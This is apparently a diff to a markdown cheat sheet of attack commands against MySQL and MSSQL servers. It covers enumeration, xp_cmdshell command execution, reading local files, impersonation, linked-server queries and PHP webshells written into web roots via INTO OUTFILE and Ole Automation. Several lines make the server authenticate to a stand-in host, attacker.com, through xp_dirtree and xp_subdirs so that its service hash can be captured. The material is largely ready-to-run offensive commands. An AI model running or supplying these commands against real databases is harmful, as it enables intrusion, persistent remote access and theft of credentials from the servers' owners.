@@ -3,9 +3,9 @@
 Enumerating MySQL (port 3306) and MSSQL (ports 1433, 2433) services.
 
 ## 1. Enumerate SQL Service and Version (nmap)
-Gather SQL service and version information.
-```
-nmap -Pn -sV -sC -p1433,3306 target.com
+Gather SQL service and version information for MySQL and MSSQL.
+```bash
+nmap -Pn -sV -sC -p1433,3306,2433 target.com
 ```
 - `-Pn`: Skips host discovery.
 - `-sV`: Detects service and version.
@@ -13,7 +13,7 @@ nmap -Pn -sV -sC -p1433,3306 target.com
 
 ## 2. Connect to MySQL (mysql)
 Connect to a MySQL server.
-```
+```bash
 mysql -u user -p'password' -h target.com
 ```
 - `-u user`: Specify username.
@@ -22,7 +22,7 @@ mysql -u user -p'password' -h target.com
 
 ## 3. Connect to MSSQL (sqlcmd)
 Connect to an MSSQL server from Windows.
-```
+```bash
 sqlcmd -S target.com -U user -P 'password' -y 30 -Y 30
 ```
 - `-S`: Target server.
@@ -32,7 +32,7 @@ sqlcmd -S target.com -U user -P 'password' -y 30 -Y 30
 
 ## 4. Connect to MSSQL from Linux (sqsh)
 Connect to MSSQL from Linux.
-```
+```bash
 sqsh -S target.com -U user -P 'password' -h
 ```
 - `-S`: Target server.
@@ -42,138 +42,201 @@ sqsh -S target.com -U user -P 'password' -h
 
 ## 5. Connect to MSSQL with Windows Auth (sqsh)
 Connect to MSSQL using Windows Authentication.
-```
+```bash
 sqsh -S target.com -U .\\user -P 'password' -h
 ```
 - `-U .\\user`: Username with local host prefix for Windows Auth.
 
-## 6. Show MySQL Databases
+## 6. Connect to MSSQL (mssqlclient.py)
+Connect to MSSQL using Impacket's mssqlclient.py.
+```bash
+mssqlclient.py -p 1433 user@target.com
+```
+- `-p 1433`: Specify port.
+- `user@target.com`: Username and target server.
+
+## 7. Show MySQL Databases
 List all available databases in MySQL.
-```
-mysql> SHOW DATABASES;
+```sql
+SHOW DATABASES;
 ```
 
-## 7. Select MySQL Database
+## 8. Select MySQL Database
 Switch to a specific database in MySQL.
-```
-mysql> USE dbname;
+```sql
+USE dbname;
 ```
 
-## 8. Show MySQL Tables
+## 9. Show MySQL Tables
 List tables in the selected database in MySQL.
-```
-mysql> SHOW TABLES;
+```sql
+SHOW TABLES;
 ```
 
-## 9. Select MySQL Table Data
+## 10. Select MySQL Table Data
 Retrieve all entries from a table in MySQL.
-```
-mysql> SELECT * FROM users;
+```sql
+SELECT * FROM users;
 ```
 
-## 10. Show MSSQL Databases
+## 11. Show MSSQL Databases
 List all available databases in MSSQL.
-```
-sqlcmd> SELECT name FROM master.dbo.sysdatabases
-sqlcmd> GO
+```sql
+SELECT name FROM master.dbo.sysdatabases
+GO
 ```
 
-## 11. Select MSSQL Database
+## 12. Select MSSQL Database
 Switch to a specific database in MSSQL.
-```
-sqlcmd> USE dbname
-sqlcmd> GO
+```sql
+USE dbname
+GO
 ```
 
-## 12. Show MSSQL Tables
+## 13. Show MSSQL Tables
 List tables in the selected database in MSSQL.
-```
-sqlcmd> SELECT * FROM dbname.INFORMATION_SCHEMA.TABLES
-sqlcmd> GO
+```sql
+SELECT table_name FROM dbname.INFORMATION_SCHEMA.TABLES
+GO
 ```
 
-## 13. Select MSSQL Table Data
+## 14. Select MSSQL Table Data
 Retrieve all entries from a table in MSSQL.
-```
-sqlcmd> SELECT * FROM users
-sqlcmd> GO
+```sql
+SELECT * FROM users
+GO
 ```
 
-## 14. Enable xp_cmdshell in MSSQL
+## 15. Enable xp_cmdshell in MSSQL
 Enable command execution in MSSQL (requires admin privileges).
-```
-sqlcmd> EXECUTE sp_configure 'show advanced options', 1
-sqlcmd> GO
-sqlcmd> RECONFIGURE
-sqlcmd> GO
-sqlcmd> EXECUTE sp_configure 'xp_cmdshell', 1
-sqlcmd> GO
-sqlcmd> RECONFIGURE
-sqlcmd> GO
+```sql
+EXECUTE sp_configure 'show advanced options', 1
+GO
+RECONFIGURE
+GO
+EXECUTE sp_configure 'xp_cmdshell', 1
+GO
+RECONFIGURE
+GO
 ```
 
-## 15. Execute System Command in MSSQL
+## 16. Execute System Command in MSSQL
 Run a system command via MSSQL (if xp_cmdshell enabled).
-```
-sqlcmd> xp_cmdshell 'whoami'
-sqlcmd> GO
+```sql
+xp_cmdshell 'whoami'
+GO
 ```
 
-## 16. Write File in MySQL
+## 17. Write File in MySQL
 Create a file (e.g., webshell) using MySQL (requires FILE privilege).
-```
-mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
+```sql
+SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
 ```
 
-## 17. Check MySQL File Privileges
+## 18. Check MySQL File Privileges
 Verify if secure_file_priv is empty for file operations.
-```
-mysql> show variables like "secure_file_priv";
+```sql
+SHOW VARIABLES LIKE 'secure_file_priv';
 ```
 
-## 18. Read Local Files in MySQL
+## 19. Read Local Files in MySQL
 Read local files in MySQL (requires FILE privilege).
-```
-mysql> select LOAD_FILE("/etc/passwd");
+```sql
+SELECT LOAD_FILE('/etc/passwd');
 ```
 
-## 19. Read Local Files in MSSQL
+## 20. Enable Ole Automation Procedures in MSSQL
+Enable file writing capabilities in MSSQL (requires admin privileges).
+```sql
+sp_configure 'show advanced options', 1
+GO
+RECONFIGURE
+GO
+sp_configure 'Ole Automation Procedures', 1
+GO
+RECONFIGURE
+GO
+```
+
+## 21. Create a File in MSSQL
+Write a file (e.g., webshell) using MSSQL (if Ole Automation enabled).
+```sql
+DECLARE @OLE INT
+DECLARE @FileID INT
+EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
+EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
+EXECUTE sp_OAMethod @FileID, 'WriteLine', NULL, '<?php echo shell_exec($_GET["c"]);?>'
+EXECUTE sp_OADestroy @FileID
+EXECUTE sp_OADestroy @OLE
+GO
+```
+
+## 22. Read Local Files in MSSQL
 Read local files in MSSQL (requires read access).
-```
-sqlcmd> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
-sqlcmd> GO
+```sql
+SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
+GO
 ```
 
-## 20. Steal MSSQL Service Hash (xp_dirtree)
+## 23. Steal MSSQL Service Hash (xp_dirtree)
 Force MSSQL to authenticate to a fake SMB share.
-```
-sqlcmd> EXEC master..xp_dirtree '\\attacker.com\share\'
-sqlcmd> GO
+```sql
+EXEC master..xp_dirtree '\\attacker.com\share\'
+GO
 ```
 
-## 21. Steal MSSQL Service Hash (xp_subdirs)
+## 24. Steal MSSQL Service Hash (xp_subdirs)
 Force MSSQL to authenticate to a fake SMB share.
-```
-sqlcmd> EXEC master..xp_subdirs '\\attacker.com\share\'
-sqlcmd> GO
+```sql
+EXEC master..xp_subdirs '\\attacker.com\share\'
+GO
 ```
 
-## 22. Identify Linked Servers in MSSQL
+## 25. Identify Users to Impersonate in MSSQL
+List users that can be impersonated in MSSQL.
+```sql
+SELECT DISTINCT b.name
+FROM sys.server_permissions a
+INNER JOIN sys.server_principals b
+ON a.grantor_principal_id = b.principal_id
+WHERE a.permission_name = 'IMPERSONATE'
+GO
+```
+
+## 26. Check Current User and Role in MSSQL
+Verify current user and sysadmin role status in MSSQL.
+```sql
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('sysadmin')
+GO
+```
+
+## 27. Impersonate a User in MSSQL
+Impersonate a user and check privileges in MSSQL.
+```sql
+EXECUTE AS LOGIN = 'username'
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('sysadmin')
+GO
+```
+
+## 28. Revert Impersonation in MSSQL
+Revert to the original user in MSSQL.
+```sql
+REVERT
+GO
+```
+
+## 29. Identify Linked Servers in MSSQL
 List linked servers in MSSQL.
-```
-sqlcmd> SELECT srvname, isremote FROM sysservers
-sqlcmd> GO
+```sql
+SELECT srvname, isremote FROM sysservers
+GO
 ```
 
-## 23. Query Linked Server in MSSQL
+## 30. Query Linked Server in MSSQL
 Check user and privileges on a linked server.
+```sql
+EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [linkedserver.com]
+GO
 ```
-sqlcmd> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [linkedserver.com]
-sqlcmd> GO
-```
-
-## Tips
-- Check for weak credentials or misconfigurations (e.g., anonymous access, empty secure_file_priv).
-- Use tools like Responder or impacket-smbserver to capture hashes with xp_dirtree/xp_subdirs.
-- Ensure admin privileges for advanced actions (e.g., xp_cmdshell, linked server queries).
-- Be cautious with command execution and file operations; verify permissions.
